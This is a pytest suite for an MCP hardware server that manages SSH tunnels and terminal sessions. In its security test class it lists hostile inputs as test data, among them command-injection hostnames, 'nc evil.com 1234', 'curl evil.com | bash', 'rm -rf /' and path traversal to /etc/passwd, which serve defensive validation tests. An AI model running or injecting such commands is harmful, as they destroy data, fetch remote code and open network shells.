#!/usr/bin/env python3
"""
Comprehensive test suite for Enhanced MCP Hardware Server
Tests all functionality with proper mocking and validation
"""

import pytest
import asyncio
import json
import tempfile
import os
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timedelta
import paramiko

# Import the server components
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from enhanced_mcp_hardware_server import (
    TunnelEndpoint, HardwareInfo, TerminalSession, TunnelManager,
    SecurityError, ConnectionError, ConfigurationError
)

class TestTunnelEndpoint:
    """Test TunnelEndpoint class functionality"""
    
    def test_valid_endpoint_creation(self):
        """Test creating a valid tunnel endpoint"""
        endpoint = TunnelEndpoint(
            hostname="test.example.com",
            username="testuser",
            private_key_path="/path/to/key",
            port=22
        )
        assert endpoint.hostname == "test.example.com"
        assert endpoint.username == "testuser"
        assert endpoint.port == 22
        assert endpoint.status == "unknown"
    
    def test_invalid_hostname_raises_error(self):
        """Test that invalid hostnames raise SecurityError"""
        with pytest.raises(SecurityError):
            TunnelEndpoint(
                hostname="invalid..hostname",
                username="testuser",
                private_key_path="/path/to/key"
            )
    
    def test_invalid_port_raises_error(self):
        """Test that invalid ports raise ConfigurationError"""
        with pytest.raises(ConfigurationError):
            TunnelEndpoint(
                hostname="test.example.com",
                username="testuser",
                private_key_path="/path/to/key",
                port=70000  # Invalid port
            )
    
    def test_empty_hostname_raises_error(self):
        """Test that empty hostname raises ConfigurationError"""
        with pytest.raises(ConfigurationError):
            TunnelEndpoint(
                hostname="",
                username="testuser",
                private_key_path="/path/to/key"
            )
    
    def test_hostname_validation(self):
        """Test hostname validation logic"""
        endpoint = TunnelEndpoint(
            hostname="valid-hostname.com",
            username="testuser",
            private_key_path="/path/to/key"
        )
        
        # Test valid hostnames
        assert endpoint._is_valid_hostname("example.com")
        assert endpoint._is_valid_hostname("sub.example.com")
        assert endpoint._is_valid_hostname("test-server.local")
        
        # Test invalid hostnames
        assert not endpoint._is_valid_hostname("-invalid.com")
        assert not endpoint._is_valid_hostname("invalid-.com")
        assert not endpoint._is_valid_hostname("invalid..com")
        assert not endpoint._is_valid_hostname("a" * 254)  # Too long

class TestTerminalSession:
    """Test TerminalSession class functionality"""
    
    def test_session_creation(self):
        """Test creating a terminal session"""
        endpoint = TunnelEndpoint(
            hostname="test.example.com",
            username="testuser",
            private_key_path="/path/to/key"
        )
        
        mock_ssh = Mock()
        mock_channel = Mock()
        
        session = TerminalSession(
            session_id="test-session",
            endpoint=endpoint,
            ssh_client=mock_ssh,
            channel=mock_channel,
            created=datetime.now(),
            last_activity=datetime.now()
        )
        
        assert session.session_id == "test-session"
        assert session.endpoint == endpoint
        assert len(session.command_history) == 0
    
    def test_session_expiration(self):
        """Test session expiration logic"""
        endpoint = TunnelEndpoint(
            hostname="test.example.com",
            username="testuser",
            private_key_path="/path/to/key"
        )
        
        # Create expired session
        old_time = datetime.now() - timedelta(hours=2)
        session = TerminalSession(
            session_id="expired-session",
            endpoint=endpoint,
            ssh_client=Mock(),
            channel=Mock(),
            created=old_time,
            last_activity=old_time,
            max_idle_time=3600  # 1 hour
        )
        
        assert session.is_expired()
    
    def test_command_history(self):
        """Test command history management"""
        endpoint = TunnelEndpoint(
            hostname="test.example.com",
            username="testuser",
            private_key_path="/path/to/key"
        )
        
        session = TerminalSession(
            session_id="test-session",
            endpoint=endpoint,
            ssh_client=Mock(),
            channel=Mock(),
            created=datetime.now(),
            last_activity=datetime.now()
        )
        
        # Add commands
        session.add_command("ls -la")
        session.add_command("pwd")
        
        assert len(session.command_history) == 2
        assert session.command_history[0] == "ls -la"
        assert session.command_history[1] == "pwd"
        
        # Test history size limit
        for i in range(150):
            session.add_command(f"command_{i}")
        
        assert len(session.command_history) == 100  # Should be limited to 100

class TestTunnelManager:
    """Test TunnelManager class functionality"""
    
    @pytest.fixture
    def temp_config_file(self):
        """Create a temporary config file for testing"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            config = {
                "mcp_server": {
                    "name": "test-server",
                    "version": "1.0.0"
                },
                "ssh_config": {
                    "private_key_path": "/test/key",
                    "username": "testuser"
                },
                "cloudflare_config": {
                    "domain": "test.com"
                },
                "endpoints": [],
                "settings": {
                    "auto_failover": True
                }
            }
            json.dump(config, f)
            f.flush()
            yield f.name
        os.unlink(f.name)
    
    def test_tunnel_manager_initialization(self, temp_config_file):
        """Test TunnelManager initialization"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            assert manager.config_file == temp_config_file
            assert isinstance(manager.endpoints, list)
            assert isinstance(manager.hardware_cache, dict)
            assert isinstance(manager.terminal_sessions, dict)
    
    def test_config_validation(self):
        """Test configuration validation"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            # Invalid config - missing required sections
            invalid_config = {"invalid": "config"}
            json.dump(invalid_config, f)
            f.flush()
            
            with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
                with pytest.raises(ConfigurationError):
                    TunnelManager(config_file=f.name)
        
        os.unlink(f.name)
    
    def test_rate_limiting(self, temp_config_file):
        """Test rate limiting functionality"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            
            # Test normal requests
            for i in range(50):
                assert manager._check_rate_limit("test_client")
            
            # Test rate limit exceeded
            for i in range(20):
                manager._check_rate_limit("test_client")
            
            # Should be rate limited now
            assert not manager._check_rate_limit("test_client")
    
    @pytest.mark.asyncio
    async def test_endpoint_testing(self, temp_config_file):
        """Test endpoint connectivity testing"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            
            endpoint = TunnelEndpoint(
                hostname="test.example.com",
                username="testuser",
                private_key_path="/test/key"
            )
            
            # Mock SSH connection
            with patch('paramiko.SSHClient') as mock_ssh_class:
                mock_ssh = Mock()
                mock_ssh_class.return_value = mock_ssh
                
                # Mock successful connection
                mock_stdout = Mock()
                mock_stdout.read.return_value = b"connection_test_1234567890"
                mock_stderr = Mock()
                mock_stderr.read.return_value = b""
                
                mock_ssh.exec_command.return_value = (Mock(), mock_stdout, mock_stderr)
                
                # Mock key loading
                with patch('paramiko.Ed25519Key.from_private_key_file') as mock_key:
                    with patch('os.path.exists', return_value=True):
                        result = await manager.test_endpoint(endpoint)
                        
                        assert result is True
                        assert endpoint.status == "active"
                        assert endpoint.response_time is not None
    
    @pytest.mark.asyncio
    async def test_endpoint_testing_failure(self, temp_config_file):
        """Test endpoint testing with connection failure"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            
            endpoint = TunnelEndpoint(
                hostname="test.example.com",
                username="testuser",
                private_key_path="/test/key"
            )
            
            # Mock SSH connection failure
            with patch('paramiko.SSHClient') as mock_ssh_class:
                mock_ssh = Mock()
                mock_ssh_class.return_value = mock_ssh
                mock_ssh.connect.side_effect = paramiko.AuthenticationException("Auth failed")
                
                with patch('os.path.exists', return_value=True):
                    result = await manager.test_endpoint(endpoint)
                    
                    assert result is False
                    assert endpoint.status == "failed"
    
    def test_add_endpoint(self, temp_config_file):
        """Test adding new endpoints"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            
            initial_count = len(manager.endpoints)
            
            endpoint = manager.add_endpoint(
                hostname="new.example.com",
                username="newuser",
                private_key_path="/new/key"
            )
            
            assert len(manager.endpoints) == initial_count + 1
            assert endpoint.hostname == "new.example.com"
            assert endpoint.username == "newuser"
    
    @pytest.mark.asyncio
    async def test_find_best_endpoint(self, temp_config_file):
        """Test finding the best available endpoint"""
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            manager = TunnelManager(config_file=temp_config_file)
            
            # Add test endpoints
            endpoint1 = TunnelEndpoint(
                hostname="slow.example.com",
                username="testuser",
                private_key_path="/test/key"
            )
            endpoint2 = TunnelEndpoint(
                hostname="fast.example.com",
                username="testuser",
                private_key_path="/test/key"
            )
            
            manager.endpoints = [endpoint1, endpoint2]
            
            # Mock endpoint testing
            async def mock_test_endpoint(endpoint):
                if endpoint.hostname == "slow.example.com":
                    endpoint.status = "active"
                    endpoint.response_time = 2.0
                    return True
                elif endpoint.hostname == "fast.example.com":
                    endpoint.status = "active"
                    endpoint.response_time = 0.5
                    return True
                return False
            
            manager.test_endpoint = mock_test_endpoint
            
            best_endpoint = await manager.find_best_endpoint()
            
            assert best_endpoint is not None
            assert best_endpoint.hostname == "fast.example.com"
            assert best_endpoint.response_time == 0.5

class TestSecurityFeatures:
    """Test security-related functionality"""
    
    def test_hostname_validation_security(self):
        """Test hostname validation prevents injection attacks"""
        # Test various malicious hostnames
        malicious_hostnames = [
            "evil.com; rm -rf /",
            "test.com && curl evil.com",
            "test.com | nc evil.com 1234",
            "test.com`curl evil.com`",
            "test.com$(curl evil.com)",
            "../../../etc/passwd",
            "test.com\nrm -rf /",
            "test.com\0evil.com"
        ]
        
        for hostname in malicious_hostnames:
            with pytest.raises((SecurityError, ConfigurationError)):
                TunnelEndpoint(
                    hostname=hostname,
                    username="testuser",
                    private_key_path="/test/key"
                )
    
    def test_command_sanitization(self):
        """Test that commands are properly sanitized"""
        # This would be implemented in the actual command execution methods
        dangerous_commands = [
            "rm -rf /",
            "curl evil.com | bash",
            "echo 'malicious' > /etc/passwd",
            "$(curl evil.com)",
            "`rm -rf /`",
            "command; rm -rf /",
            "command && curl evil.com"
        ]
        
        # For now, just ensure we have a list of dangerous patterns
        # In production, these would be filtered or escaped
        assert len(dangerous_commands) > 0

class TestErrorHandling:
    """Test error handling and recovery"""
    
    def test_configuration_error_handling(self):
        """Test handling of configuration errors"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write("invalid json content")
            f.flush()
            
            with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
                with pytest.raises(ConfigurationError):
                    TunnelManager(config_file=f.name)
        
        os.unlink(f.name)
    
    def test_missing_config_file_handling(self):
        """Test handling of missing configuration file"""
        non_existent_file = "/tmp/non_existent_config.json"
        
        with patch('enhanced_mcp_hardware_server.asyncio.create_task'):
            # Should create default config and not raise error
            manager = TunnelManager(config_file=non_existent_file)
            assert os.path.exists(non_existent_file)
            
        # Cleanup
        if os.path.exists(non_existent_file):
            os.unlink(non_existent_file)

if __name__ == "__main__":
    pytest.main([__file__, "-v"])